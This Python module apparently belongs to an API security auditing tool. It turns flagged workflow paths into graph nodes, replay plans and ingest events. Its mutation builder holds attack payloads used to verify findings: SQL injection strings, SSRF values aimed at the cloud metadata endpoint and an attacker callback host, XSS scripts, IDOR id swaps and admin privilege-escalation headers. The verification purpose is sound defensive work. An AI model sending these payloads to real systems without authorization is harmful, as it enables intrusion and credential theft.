from __future__ import annotations

from dataclasses import dataclass
import hashlib
import json
from typing import Any, Callable
from urllib import error, request

from pydantic import BaseModel, Field, model_validator

from api.schemas.events import EventSeverity, EventSource, IngestScanEventRequest
from api.schemas.findings import FindingSeverity
from api.schemas.planner import VerifierStrategy, VulnerabilityClass
from api.schemas.producer_contracts import WorkflowMapperPathFlaggedContract
from api.schemas.verifier_jobs import ReplayMutationSpec, ReplayMutationType, ReplayPlan, ReplayRequestSpec
from api.schemas.workflows import WorkflowEdge, WorkflowNode, WorkflowNodeStatus, WorkflowNodeType


def _node_status(severity: FindingSeverity) -> WorkflowNodeStatus:
    if severity == FindingSeverity.CRITICAL:
        return WorkflowNodeStatus.CRITICAL
    if severity == FindingSeverity.HIGH:
        return WorkflowNodeStatus.HIGH
    return WorkflowNodeStatus.REVIEW


def _event_severity(severity: FindingSeverity) -> EventSeverity:
    if severity == FindingSeverity.CRITICAL:
        return EventSeverity.CRITICAL
    if severity == FindingSeverity.HIGH:
        return EventSeverity.HIGH
    return EventSeverity.WARNING


def _stable_id(prefix: str, value: str, *, length: int = 10) -> str:
    return f"{prefix}-{hashlib.sha1(value.encode('utf-8')).hexdigest()[:length]}"


class WorkflowObservedStep(BaseModel):
    node_id: str = Field(min_length=3, max_length=64)
    label: str = Field(min_length=3, max_length=200)
    phase: str = Field(min_length=2, max_length=64)
    detail: str = Field(min_length=3, max_length=800)
    host: str | None = Field(default=None, max_length=120)
    path: str | None = Field(default=None, max_length=400)
    method: str | None = Field(default=None, max_length=16)
    actor: str | None = Field(default=None, max_length=120)
    request_fingerprint: str | None = Field(default=None, max_length=120)
    replay_artifact_id: str | None = Field(default=None, max_length=64)


class WorkflowPathFindingCandidate(BaseModel):
    path_id: str | None = Field(default=None, max_length=120)
    scan_id: str = Field(min_length=3, max_length=64)
    title: str = Field(min_length=3, max_length=200)
    rationale: str = Field(min_length=3, max_length=1500)
    severity: FindingSeverity
    vulnerability_class: VulnerabilityClass
    confidence: int = Field(ge=0, le=100)
    matched_rule: str = Field(min_length=3, max_length=120)
    verifier_strategy: VerifierStrategy
    matched_signals: list[str] = Field(default_factory=list)
    steps: list[WorkflowObservedStep] = Field(min_length=2)
    actor: str | None = Field(default=None, max_length=120)
    flagged_paths_increment: int = Field(default=1, ge=0)

    @model_validator(mode="after")
    def validate_unique_step_ids(self) -> WorkflowPathFindingCandidate:
        node_ids = [step.node_id for step in self.steps]
        if len(set(node_ids)) != len(node_ids):
            raise ValueError("Workflow path candidate step ids must be unique.")
        return self


def build_path_nodes(candidate: WorkflowPathFindingCandidate) -> list[WorkflowNode]:
    status = _node_status(candidate.severity)
    nodes = [
        WorkflowNode(
            id=step.node_id,
            label=step.label,
            type=WorkflowNodeType.ENDPOINT,
            phase=step.phase,
            detail=step.detail,
            status=status,
            x=660.0 + (index * 240.0),
            y=180.0,
        )
        for index, step in enumerate(candidate.steps)
    ]

    nodes.append(
        WorkflowNode(
            id=f"path-flag-{_stable_id('node', candidate.path_id or candidate.title)}",
            label=f"Flagged Path: {candidate.title}",
            type=WorkflowNodeType.OBSERVATION,
            phase="verification",
            detail=candidate.rationale,
            status=status,
            x=660.0 + (len(candidate.steps) * 240.0),
            y=180.0,
        )
    )
    return nodes


def build_path_edges(candidate: WorkflowPathFindingCandidate, nodes: list[WorkflowNode]) -> list[WorkflowEdge]:
    edges = [
        WorkflowEdge(
            source=candidate.steps[index].node_id,
            target=candidate.steps[index + 1].node_id,
            label="observed sequence",
            style="solid",
            animated=True,
        )
        for index in range(len(candidate.steps) - 1)
    ]
    edges.append(
        WorkflowEdge(
            source=candidate.steps[-1].node_id,
            target=nodes[-1].id,
            label="flagged path",
            style="dashed",
            animated=True,
        )
    )
    return edges


def build_replay_plan(candidate: WorkflowPathFindingCandidate) -> ReplayPlan | None:
    replay_requests = [
        ReplayRequestSpec(
            artifact_id=step.replay_artifact_id,
            request_fingerprint=step.request_fingerprint,
            method=step.method,
            host=step.host,
            path=step.path,
            actor=step.actor or candidate.actor,
        )
        for step in candidate.steps
        if step.request_fingerprint and step.method and step.host and step.path
    ]

    if not replay_requests:
        return None

    mutations = build_mutations(candidate, replay_requests)

    success_status_codes = [200, 202, 204]
    if replay_requests[-1].method.upper() in {"DELETE", "PATCH", "PUT"}:
        success_status_codes = [200, 202, 204]
    elif replay_requests[-1].method.upper() in {"GET", "HEAD"}:
        success_status_codes = [200]

    return ReplayPlan(
        actor=candidate.actor or replay_requests[-1].actor,
        requests=replay_requests,
        success_status_codes=success_status_codes,
        mutations=mutations,
    )


def _last_numeric_segment(path: str | None) -> str | None:
    if not path:
        return None
    segments = [segment for segment in path.split("/") if segment]
    for segment in reversed(segments):
        if segment.isdigit():
            return segment
    return None


def build_mutations(candidate: WorkflowPathFindingCandidate, replay_requests: list[ReplayRequestSpec]) -> list[ReplayMutationSpec]:
    mutations: list[ReplayMutationSpec] = []
    final_request = replay_requests[-1]

    if candidate.vulnerability_class in {"bola_idor", "tenant_isolation"}:
        current_id = _last_numeric_segment(final_request.path)
        if current_id is not None:
            mutations.append(
                ReplayMutationSpec(
                    type=ReplayMutationType.PATH_REPLACE,
                    target_request_fingerprint=final_request.request_fingerprint,
                    from_value=current_id,
                    to_value="999999",
                )
            )

    if candidate.vulnerability_class == "mass_assignment":
        mutations.extend(
            [
                ReplayMutationSpec(
                    type=ReplayMutationType.BODY_JSON_SET,
                    target_request_fingerprint=final_request.request_fingerprint,
                    body_field="role",
                    value="admin",
                ),
                ReplayMutationSpec(
                    type=ReplayMutationType.BODY_JSON_SET,
                    target_request_fingerprint=final_request.request_fingerprint,
                    body_field="permissions",
                    value=["admin"],
                ),
                ReplayMutationSpec(
                    type=ReplayMutationType.HEADER_SET,
                    target_request_fingerprint=final_request.request_fingerprint,
                    header_name="X-Role",
                    value="admin",
                ),
            ]
        )

    if candidate.vulnerability_class == "bfla":
        mutations.append(
            ReplayMutationSpec(
                type=ReplayMutationType.HEADER_SET,
                target_request_fingerprint=final_request.request_fingerprint,
                header_name="X-Permission-Override",
                value="admin",
            )
        )

    if candidate.vulnerability_class == "unsafe_destructive_action":
        mutations.append(
            ReplayMutationSpec(
                type=ReplayMutationType.HEADER_SET,
                target_request_fingerprint=final_request.request_fingerprint,
                header_name="X-Confirm-Destructive-Action",
                value="true",
            )
        )

    if candidate.vulnerability_class == "sqli":
        mutations.extend(
            [
                ReplayMutationSpec(
                    type=ReplayMutationType.QUERY_SET,
                    target_request_fingerprint=final_request.request_fingerprint,
                    query_param="q",
                    value="' OR '1'='1",
                ),
                ReplayMutationSpec(
                    type=ReplayMutationType.QUERY_SET,
                    target_request_fingerprint=final_request.request_fingerprint,
                    query_param="filter",
                    value="1 OR 1=1",
                ),
                ReplayMutationSpec(
                    type=ReplayMutationType.BODY_JSON_SET,
                    target_request_fingerprint=final_request.request_fingerprint,
                    body_field="query",
                    value="' UNION SELECT 1 --",
                ),
            ]
        )

    if candidate.vulnerability_class == "ssrf":
        mutations.extend(
            [
                ReplayMutationSpec(
                    type=ReplayMutationType.QUERY_SET,
                    target_request_fingerprint=final_request.request_fingerprint,
                    query_param="url",
                    value="http://169.254.169.254/latest/meta-data/",
                ),
                ReplayMutationSpec(
                    type=ReplayMutationType.BODY_JSON_SET,
                    target_request_fingerprint=final_request.request_fingerprint,
                    body_field="url",
                    value="http://169.254.169.254/latest/meta-data/",
                ),
                ReplayMutationSpec(
                    type=ReplayMutationType.BODY_JSON_SET,
                    target_request_fingerprint=final_request.request_fingerprint,
                    body_field="callback_url",
                    value="https://attacker.example.invalid/hook",
                ),
            ]
        )

    if candidate.vulnerability_class == "stored_xss":
        mutations.extend(
            [
                ReplayMutationSpec(
                    type=ReplayMutationType.BODY_JSON_SET,
                    target_request_fingerprint=final_request.request_fingerprint,
                    body_field="content",
                    value="<script>alert('stored-xss')</script>",
                ),
                ReplayMutationSpec(
                    type=ReplayMutationType.BODY_JSON_SET,
                    target_request_fingerprint=final_request.request_fingerprint,
                    body_field="message",
                    value="<img src=x onerror=alert('stored-xss')>",
                ),
            ]
        )

    if candidate.vulnerability_class == "reflected_xss":
        mutations.extend(
            [
                ReplayMutationSpec(
                    type=ReplayMutationType.QUERY_SET,
                    target_request_fingerprint=final_request.request_fingerprint,
                    query_param="q",
                    value="<script>alert('reflected-xss')</script>",
                ),
                ReplayMutationSpec(
                    type=ReplayMutationType.QUERY_SET,
                    target_request_fingerprint=final_request.request_fingerprint,
                    query_param="search",
                    value="<svg/onload=alert('reflected-xss')>",
                ),
            ]
        )

    return mutations


def build_workflow_mapper_contract(candidate: WorkflowPathFindingCandidate) -> WorkflowMapperPathFlaggedContract:
    nodes = build_path_nodes(candidate)
    edges = build_path_edges(candidate, nodes)
    return WorkflowMapperPathFlaggedContract(
        path_id=candidate.path_id or _stable_id("path", candidate.title),
        title=candidate.title,
        severity=candidate.severity,
        vulnerability_class=candidate.vulnerability_class,
        confidence=candidate.confidence,
        matched_rule=candidate.matched_rule,
        verifier_strategy=candidate.verifier_strategy,
        rationale=candidate.rationale,
        matched_signals=list(candidate.matched_signals),
        nodes=nodes,
        edges=edges,
        flagged_paths_increment=candidate.flagged_paths_increment,
        replay_plan=build_replay_plan(candidate),
    )


def build_ingest_request(candidate: WorkflowPathFindingCandidate) -> IngestScanEventRequest:
    contract = build_workflow_mapper_contract(candidate)
    return IngestScanEventRequest(
        contract_version="v1",
        source=EventSource.WORKFLOW_MAPPER,
        event_type=contract.kind,
        stage="verification",
        severity=_event_severity(candidate.severity),
        message=f"Workflow mapper flagged path: {candidate.title}",
        producer_contract=contract,
    )


@dataclass(frozen=True, slots=True)
class WorkflowMapperPublishOptions:
    backend_url: str
    ingest_token: str
    timeout_seconds: float = 3.0


def post_flagged_path(options: WorkflowMapperPublishOptions, scan_id: str, payload: dict[str, Any]) -> int:
    endpoint = f"{options.backend_url.rstrip('/')}/scans/{scan_id}/events"
    encoded_payload = json.dumps(payload, ensure_ascii=True).encode("utf-8")
    http_request = request.Request(
        endpoint,
        data=encoded_payload,
        headers={
            "Content-Type": "application/json",
            "X-Auditor-Ingest-Token": options.ingest_token,
        },
        method="POST",
    )

    try:
        with request.urlopen(http_request, timeout=options.timeout_seconds) as response:
            return int(response.status)
    except error.HTTPError as exc:
        return int(exc.code)


@dataclass(slots=True)
class WorkflowMapperWorker:
    options: WorkflowMapperPublishOptions
    sender: Callable[[WorkflowMapperPublishOptions, str, dict[str, Any]], int] = post_flagged_path

    def publish_flagged_path(self, candidate: WorkflowPathFindingCandidate) -> bool:
        payload = build_ingest_request(candidate).model_dump(mode="json")
        status_code = self.sender(self.options, candidate.scan_id, payload)
        return 200 <= status_code < 300
